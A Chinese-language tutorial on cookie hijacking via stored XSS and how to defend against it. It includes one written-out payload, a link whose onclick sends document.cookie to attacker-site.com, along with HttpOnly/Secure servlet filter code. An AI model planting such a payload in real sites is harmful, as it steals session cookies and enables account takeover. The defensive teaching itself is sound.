[TOC]
##你必须知道的cookie攻防技术
```
我们来谈谈简单的xss攻击, 以及Cookie劫持的攻与防.
案列:
　　听闻之前通过CCTV电话访问周鸿祎时, 分析其按键声音从而获取红衣教主的电话号码的那个传奇大侠.

　　其后续的一个得意之作, 便是通过给大学的一个助教发了份钓鱼邮件, 成功获取了助教的cookie信息, 最终登陆系统, 提前获取了成绩信息.

　　那它是怎么实现的呢.

　　1. Cookie是什么?

　　2. 窃取的原理是什么?

　　3. 系统如何防Cookie劫持呢?

　　看完这三个回答, 你就明白哪位传奇大侠是如何成功的!!!
```
###Cookie
```
　　HTTP天然是无状态的协议, 为了维持和跟踪用户的状态, 引入了Cookie和Session. Cookie包含了浏览器客户端的用户凭证, 相对较小. Session则维护在服务器, 用于维护相对较大的用户信息.

　　用通俗的语言, Cookie是钥匙, Session是锁芯.

　　Cookie简单理解就是钥匙, 每次去服务端获取资源, 需要带着这把钥匙, 只有自己的锁芯(资源), 才能打开.

　　如果你丢掉了钥匙, 那没办法, 只能配一把钥匙和锁芯.

　　但是如果钥匙被别人拿了, 那别人就可以冒充你的身份, 去打开你的锁芯, 从而获取你的信息, 甚至挪用你的资金. 这是非常危险的.
```
###XSS攻击
```
　　XSS(Cross Site Scripting)是跨站点脚本攻击的缩写. 其就是利用站点开放的文本编辑并发布的功能, 从而造成攻击.

　　其实说的简单一点, 就是输入javascript脚本, 窃取并投递cookie信息到自己的站点.

　　比如攻击者以一个普通用户登录进来，然后在输入框中提交以下数据：

<a href=# onclick=\”document.location=\’http://attacker-site.com/xss_collect?m=\’+escape\(document.cookie\)\;\”>快看, 这里有美女在洗澡</a>

攻击者提交了条带<a>标签的数据，该条数据保存于服务器端，而管理员登入时，不小心点击这个链接时，则会把自身的cookie信息, 投递给hacker设定的网址.

http://attacker-site.com/xss_collect/m=xxxxxxyyyyyzzz

　　有了该session-id，攻击者在会话有效期内即可获得管理员的权限，并且由于攻击数据已添加入数据库，只要攻击数据未被删除，那么攻击还有可能生效，是持久性的。
```
###Cookie劫持的防
```
　　基于XSS攻击, 窃取Cookie信息, 并冒充他人身份.

　　服务端如何防呢?

　　第一种办法是:

　　给Cookie添加HttpOnly属性, 这种属性设置后, 只能在http请求中传递, 在脚本中, document.cookie无法获取到该Cookie值. 对XSS的攻击, 有一定的防御值. 但是对网络拦截, 还是泄露了.

　　第二种办法:

　　在cookie中添加校验信息, 这个校验信息和当前用户外置环境有些关系,比如ip,user agent等有关. 这样当cookie被人劫持了, 并冒用, 但是在服务器端校验的时候, 发现校验值发生了变化, 因此要求重新登录, 这样也是种很好的思路, 去规避cookie劫持.

　　第三种办法:

　　cookie中session id的定时更换, 让session id按一定频率变换, 同时对用户而言, 该操作是透明的, 这样保证了服务体验的一致性.

　　后记:

　　对XSS的攻与防, 有很多思路和解决方案. 该文章也是简单谈谈对Cookie劫持的攻与防的一些思路.
```
###Cookie设置HttpOnly，Secure，Expire属性
```
1、在Web工程上增加一个Filter对Cookie进行处理
public class CookieFilter implements Filter {  
        public void doFilter(ServletRequest request, ServletResponse response,  
                FilterChain chain) throws IOException, ServletException {  
            HttpServletRequest req = (HttpServletRequest) request;  
            HttpServletResponse resp = (HttpServletResponse) response;  
      
            Cookie[] cookies = req.getCookies();  
      
            if (cookies != null) {  
                    Cookie cookie = cookies[0];  
                    if (cookie != null) {  
                        /*cookie.setMaxAge(3600); 
                        cookie.setSecure(true); 
                        resp.addCookie(cookie);*/  
                          
                        //Servlet 2.5不支持在Cookie上直接设置HttpOnly属性  
                        String value = cookie.getValue();  
                        StringBuilder builder = new StringBuilder();  
                        builder.append("JSESSIONID=" + value + "; ");  
                        builder.append("Secure; ");  
                        builder.append("HttpOnly; ");  
                        Calendar cal = Calendar.getInstance();  
                        cal.add(Calendar.HOUR, 1);  
                        Date date = cal.getTime();  
                        Locale locale = Locale.CHINA;  
                        SimpleDateFormat sdf =   
                                new SimpleDateFormat("dd-MM-yyyy HH:mm:ss",locale);  
                        builder.append("Expires=" + sdf.format(date));  
                        resp.setHeader("Set-Cookie", builder.toString());  
                    }  
            }  
            chain.doFilter(req, resp);  
        }  
      
        public void destroy() {  
        }  
      
        public void init(FilterConfig arg0) throws ServletException {  
        }  
    }

    2、web.xml:
<filter>  
    <filter-name>cookieFilter</filter-name>  
    <filter-class>com.sean.CookieFilter</filter-class>  
</filter>  
  
<filter-mapping>  
    <filter-name>cookieFilter</filter-name>  
    <url-pattern>/*</url-pattern>  
</filter-mapping>

3、测试
http://localhost:8080/web/test.jsp
响应头信息：
Set-Cookie:JSESSIONID=;Secure;HttpOnly;


```